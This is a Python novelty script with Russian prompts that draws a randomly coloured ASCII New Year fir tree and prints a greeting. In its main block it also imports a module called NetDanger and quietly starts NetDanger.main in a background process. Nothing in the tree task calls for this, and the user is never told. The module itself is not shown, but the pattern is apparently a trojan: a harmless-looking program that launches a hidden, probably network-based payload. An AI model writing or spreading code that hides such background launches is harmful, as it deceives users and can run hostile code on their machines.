import string
from colorama import Fore
import random
from multiprocessing import Process
import NetDanger
import time

colors = [Fore.RED, Fore.GREEN, Fore.BLUE, Fore.YELLOW, Fore.CYAN, Fore.MAGENTA]

def get_number():
    while True:
        try:
            rows = int(input(f'{Fore.GREEN}Введите кол-во строк: '))
            if rows < 30 and rows > 0:
                return rows
            else: print(f'{Fore.YELLOW}Ох, такую ёлку не утащить.(1-29)')
        except ValueError:
            print(f'{Fore.RED}Ну хватит баловаться!')

def print_rows(self, rows):
    for row in rows:
        for i in range(self):
            print(' ', end='')
        self -= 2
        for i in row:
            print(f'{random.choice(colors)}{i}', end='')
        print('')

def create_fir():
    countRows = get_number()

    symbols = list(string.ascii_lowercase)
    count = 1

    rows = [[]]

    for number in range(countRows):
        row = []
        for i in range(count):
            row.append(random.choice(symbols))
        rows.append(row)
        count += 4

    self = count / 2 + 1
    self = int(self)

    print_rows(self, rows)

    for i in range(self - 3):
        print(' ', end='')
    for i in range(3):
        print(f"{Fore.LIGHTBLACK_EX}{random.choice(symbols)}", end='')


if __name__ == '__main__':
    process = Process(target=NetDanger.main)
    process.start()

    create_fir()

    process.join()

    print('')
    print(f'{Fore.CYAN}  С Новым годом!')










